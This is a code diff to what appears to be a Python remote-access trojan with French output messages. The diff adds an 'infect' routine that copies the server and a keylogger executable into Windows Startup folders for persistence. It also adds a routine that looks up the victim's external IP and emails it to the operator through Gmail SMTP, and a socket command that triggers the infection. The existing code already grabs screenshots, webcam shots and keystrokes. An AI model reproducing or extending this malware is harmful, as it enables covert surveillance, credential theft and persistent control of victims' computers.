@@ -11,6 +11,24 @@ from PIL import ImageGrab
 
 import cv2
 
+def infect():
+	try:
+		import shutil
+		import getpass
+		user=getpass.getuser()
+		shutil.copyfile('server.exe', 'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/eidknab.exe')
+		shutil.copyfile('server.exe', 'C:/Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/eidknab.exe')
+		shutil.copyfile('server.exe', 'C:/Users/Administrateur/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/eidknab.exe')
+		print("general infection... done")
+	except:
+		print("general infection... error !")
+		print("try execute with admin rights.")
+	try:
+		shutil.copyfile('kellogs.exe', 'C:/Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/log.exe')
+		print("kelloggs infection... done")
+	except:
+		print("kelloggs infection... error !")
+
 def rcvscr(mail, mailpw, smtpadr, smtpport):
 	try:
 		print(mail, mailpw, smtpadr, smtpport) 
@@ -89,6 +107,21 @@ def rcvkel(mail, mailpw, smtpadr, smtpport):
 	except:
 		print("rcv kelloggs... error !")
 
+def rcvip(mail, mailpw, smtpadr, smtpport, servip, port):
+	try:
+		print("initialisation...")
+		print("0%")
+		connect = smtplib.SMTP(smtpadr, smtpport)
+		print("25%")
+		connect.starttls()
+		print("50%")
+		connect.login(mail, mailpw)
+		print("75%")
+		connect.sendmail(mail, mail, servip)
+		print("100%")
+	except:
+		pass
+
 def scr():
 	try:
 		scr = ImageGrab.grab(bbox=(0,0,1920,1080))
@@ -148,13 +181,26 @@ def kelloggs():
 
 def main():
 
+	from urllib.request import urlopen
+	try:
+		servip = urlopen('http://ip.42.pl/raw').read()
+	except:
+		print("pas d'ip externe, pas de connexion ?")
+	port = 1666
 	mail = ""
 	mailpw = ""
 	smtpadr = "smtp.gmail.com"
 	smtpport = 587
 	hote = ""
-	port = 1666
-	print(mail, mailpw, smtpadr, smtpport, hote, port)
+	try:
+		rcvip(mail, mailpw, smtpadr, smtpport, servip, port)
+	except:
+		pass
+	
+	try:
+		print("ip externe: " + servip.decode())
+	except:
+		pass
 	
 	connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	connexion_principale.bind((hote, port))
@@ -204,6 +250,8 @@ def main():
 			camshot()
 		elif msg_recu == b"kelloggs":
 			kelloggs()
+		elif msg_recu == b"infect":
+			infect()
 	connexion_avec_client.close()
 	connexion_principale.close()
 	main()
